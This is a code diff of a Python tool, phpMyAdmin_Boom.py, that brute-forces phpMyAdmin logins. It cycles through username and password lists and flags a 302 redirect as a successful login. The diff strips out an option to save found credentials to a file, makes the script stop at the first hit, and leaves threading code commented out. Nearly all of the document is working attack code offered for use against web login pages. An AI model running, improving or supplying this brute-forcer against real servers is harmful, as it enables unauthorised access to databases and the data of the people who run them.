@@ -11,6 +11,7 @@ import requests
 import re
 import sys
 import threading
+import queue
 import pyfiglet
 
 
@@ -27,7 +28,7 @@ def init():
     print('\t\t\t\t\t\tPower by metaStor  v1.0\n\n')
 
 
-def attack(url, user, password, output):
+def attack(url, user, password):
     header = headers
     # first get
     resp = requests.get(url, headers=headers)
@@ -51,42 +52,32 @@ def attack(url, user, password, output):
     # no Redirects
     if response.status_code == 302:
         print("\033[1;31;44m[!] Find it!  ==>\t%s %s \033[0m" % (user, password))
-        if output:
-            write(output, user, password)
-        return True
-    return False
+        sys.exit(0)
 
 
-# 当前为单线程
-def run(url, user, passwords, output):
+# 单线程
+def run(url, user, passwords):
     print("[!] Attack " + user)
     for line in open(passwords, 'r'):
         password = line.strip()
-        res = attack(url, user, password, output)
-        if res:
-            sys.exit(0)
         print('[-] Attempt\t%s - %s' % (user, password))
-        # t = threading.Thread(target=attack, args=(user, password))
-        # t.start()
+        attack(url, user, password)
+       # task = threading.Thread(target=attack, args=(url, user, password))
+       # task.start()
+       # task.join()
 
 
 def exception():
-    print('Usage: python phpMyAdmin_Boom.py -u <url> -l <user>/<user file> -p <password file> -o <output>')
+    print('Usage: python phpMyAdmin_Boom.py -u <url> -l <user>/<user file> -p <password file>')
     print("""
 Options:
   -h, --help       Show help message and exit
   -u=URL           Url, http://site/phpmyadmin
   -l=USERNAME      Username or path
   -p=PASSWORD      Password path
-  -o=OUTPUT        Output Path (Optional)
 """
           )
     exit(-1)
-
-
-def write(output, user, password):
-    with open(output, 'a+') as fp:
-        fp.write(user + '\t-\t' + password + '\n')
 
 
 if __name__ == '__main__':
@@ -100,20 +91,16 @@ if __name__ == '__main__':
         url = str(args[2])
         users = str(args[4])  # ['root', 'mysql', 'guest', 'test']
         passwords = str(args[6])
-        output = None
-        # 结果是否输出到文件
-        if len(args) == 8:
-            output = str(args[8])
         # Password must be a file
         if '.' in passwords:
             # Username with a file
             if '.' in users:
                 for line in open(users, 'r'):
                     user = line.strip()
-                    run(url, user, passwords, output)
+                    run(url, user, passwords)
             # Just a username
             else:
-                run(url, users, passwords, output)
+                run(url, users, passwords)
             print("\n[!] Complete")
         else:
             exception()
